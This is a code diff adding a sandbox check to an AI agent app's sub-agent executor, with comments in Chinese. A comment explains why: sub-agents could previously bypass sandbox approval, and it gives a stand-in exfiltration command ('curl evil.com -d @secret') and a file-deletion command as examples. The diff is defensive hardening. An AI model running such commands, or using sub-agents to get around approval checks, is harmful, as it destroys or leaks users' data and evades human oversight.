@@ -1373,6 +1373,33 @@ class SubAgentExecutor(QThread):
             if _interactive:
                 return None, []
 
+            # ★ EU-G1：沙箱判定（执行前）
+            # 子智能体此前**只有工具开关一层门**（_check_ui_tool_permission），
+            # 无沙箱判定 → 可执行 `rm D:/重要文件` 或 `curl evil.com -d @secret`
+            # 而不触发沙箱审批，绕过主对话享有的全部 L1 防护。
+            # 策略甲：confirm/deny **一律按拒绝**处理 —— 子智能体跨线程运行、
+            # 无 UI 交互能力（不能弹审批卡），无人值守下不能"等用户点允许"。
+            # 沙箱关闭（默认）时 sandbox_check_tool 早返回 ALLOW → 零行为变化。
+            _sandbox_verdict = None
+            try:
+                from pathlib import Path
+
+                from app.tools.sandbox import sandbox_check_tool
+
+                _wd = None
+                if self.tool_executor and hasattr(self.tool_executor, "get_workdir"):
+                    _wd = self.tool_executor.get_workdir()
+                # 显式传 workdir：避免 _current_workdir() 读全局单例导致多窗口串味
+                _sandbox_verdict = sandbox_check_tool(
+                    tool_name,
+                    dict(arguments or {}),
+                    workdir=Path(_wd) if _wd else None,
+                )
+            except Exception as e:  # noqa: BLE001 - 安全增强不可阻断正常使用（fail-open）
+                logger.warning(f"[SubAgent] 沙箱检查失败放行: {e}")
+            if _sandbox_verdict in ("deny", "confirm"):
+                logger.info(f"[SubAgent] tool={tool_name} 被沙箱拦截（{_sandbox_verdict}），跳过执行")
+
             # ★ T24 方案 B：UI 工具权限检查（执行前）
             # UI 调整（ToolPermissionController）对子智能体结构性生效：
             # - deny：跳过执行，回填失败 ToolResult（保持 tool_call_id 与消息顺序）
@@ -1386,6 +1413,8 @@ class SubAgentExecutor(QThread):
             elif _ui_permission == "deny":
                 _ui_denied = True
                 logger.info(f"[SubAgent] 工具 {tool_name} 已被 UI 禁用（deny），跳过执行")
+            if _sandbox_verdict in ("deny", "confirm"):
+                _ui_denied = True
 
             self._tool_call_count += 1
             self.tool_call_started.emit(self.task_id, tool_name, arguments)
@@ -1397,7 +1426,18 @@ class SubAgentExecutor(QThread):
 
             if _ui_denied:
                 # 跳过执行，回填失败 ToolResult（保持 tool_call_id 与消息顺序）
-                result = ToolResult(False, error=f"工具 {tool_name} 已被禁用或拒绝")
+                if _sandbox_verdict in ("deny", "confirm"):
+                    # 沙箱拦截：明确告知原因 + 引导模型改走主对话（子智能体无审批 UI）
+                    result = ToolResult(
+                        False,
+                        error=(
+                            f"工具 {tool_name} 被安全中心拦截（沙箱判定：{_sandbox_verdict}）。"
+                            "子智能体无法弹审批窗，请改为让主对话代为执行此操作，"
+                            "或改用不触碰沙箱边界的替代方案。"
+                        ),
+                    )
+                else:
+                    result = ToolResult(False, error=f"工具 {tool_name} 已被禁用或拒绝")
             else:
                 # tool_executor.execute() 内部已同步触发 PreToolUse 和 PostToolUse，
                 # 消息分别进 backend 的 _pre_tool_message_queue / _hook_message_queue
